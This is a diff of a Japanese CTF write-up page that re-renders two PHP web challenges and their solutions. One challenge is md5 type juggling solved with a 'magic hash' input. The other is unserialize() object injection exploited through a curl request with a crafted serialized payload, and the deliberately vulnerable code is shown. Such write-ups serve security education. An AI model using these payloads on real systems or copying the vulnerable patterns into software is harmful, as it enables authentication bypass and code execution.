-        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-        <span class="k">die</span><span class="p">();</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;240610708&#34;</span><span class="p">;</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]))</span> <span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;It is not THAT easy!&#39;</span><span class="p">);</span>
-            <span class="p">}</span> 
-            <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]);</span>
-            <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
-                <span class="k">print</span> <span class="s2">&#34;Congratulations! Your flag is: </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
-            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                <span class="k">print</span> <span class="s2">&#34;Flag not found!&#34;</span><span class="p">;</span>
-            <span class="p">}</span>
-        <span class="p">}</span> 
-    <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&#34;240610708&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;It is not THAT easy!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$key</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">print</span> <span class="s2">&#34;Congratulations! Your flag is: </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">print</span> <span class="s2">&#34;Flag not found!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>以下から<code>QLTHNDT</code>をピックアップしました。<br />
 <a href="https://github.com/spaze/hashes/blob/master/md5.md">https://github.com/spaze/hashes/blob/master/md5.md</a></p>
-<p><br /></p>
+<br />
 <p>以下にアクセスすると、フラグが得られます。<br /></p>
 <pre>
 http://challenges.defsoc.tk:8080/index.php?hash=QLTHNDT
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>flag{php_typ3_juggl1ng_1s_c00l}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1337,12 +1333,12 @@ http://challenges.defsoc.tk:8080/index.php?hash=QLTHNDT
 <br /><br />
 URL: <a href="http://challenges.defsoc.tk:3000">http://challenges.defsoc.tk:3000</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-12">Solution</h3>
 <p>ソースコードが見えるようになっています。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1369,44 +1365,44 @@ URL: <a href="http://challenges.defsoc.tk:3000">http://challenges.defsoc.tk:3000
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-PHP" data-lang="PHP"><span class="cp">&lt;?php</span> 
-<span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>  
-
-<span class="k">class</span> <span class="nc">Magic</span> <span class="p">{</span>
-    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">doMagic</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
-          <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
-          <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">else</span> <span class="p">{</span>
-            <span class="k">echo</span> <span class="s2">&#34;Nothing...&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">]))</span> <span class="p">{</span>  
-    <span class="nv">$magic</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">]);</span> 
-    <span class="nv">$magic</span><span class="o">-&gt;</span><span class="na">doMagic</span><span class="p">();</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="k">print</span> <span class="s2">&#34;Nothing...&#34;</span><span class="p">;</span>
-<span class="p">}</span>  
-
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Magic</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">doMagic</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Nothing...&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">]))</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="nv">$magic</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">]);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$magic</span><span class="o">-&gt;</span><span class="na">doMagic</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">print</span> <span class="s2">&#34;Nothing...&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>参考情報：</p>
 <p><a href="https://www.php.net/manual/ja/function.unserialize.php">https://www.php.net/manual/ja/function.unserialize.php</a></p>
 <div class="admonition quote"><p class="admonition-title">引用</p>
 <p>警告</p>
 <p>allowed_classes の options の値にかかわらず、 ユーザーからの入力をそのまま unserialize() に渡してはいけません。 アンシリアライズの時には、オブジェクトのインスタンス生成やオートローディングなどで コードが実行されることがあり、悪意のあるユーザーがこれを悪用するかもしれないからです。 シリアル化したデータをユーザーに渡す必要がある場合は、安全で標準的なデータ交換フォーマットである JSON などを使うようにしましょう。 json_decode() および json_encode() を利用します。</p>
 </div>
-<p><br /></p>
+<br />
 <p>OWASPでも説明されていて、今回の回答に非常に近いものも載ってます。<br />
 <a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></p>
-<p><br /></p>
+<br />
 <pre>
 $ curl 'http://challenges.defsoc.tk:3000/?magic=O:5:"Magic":1:{s:3:"key";b:1;}'
 
@@ -1478,7 +1474,7 @@ Magic happens here >>> flag{php_d3s3r14l1z4t10n_3xpl01ts}
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -1513,20 +1509,21 @@ Magic happens here >>> flag{php_d3s3r14l1z4t10n_3xpl01ts}
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
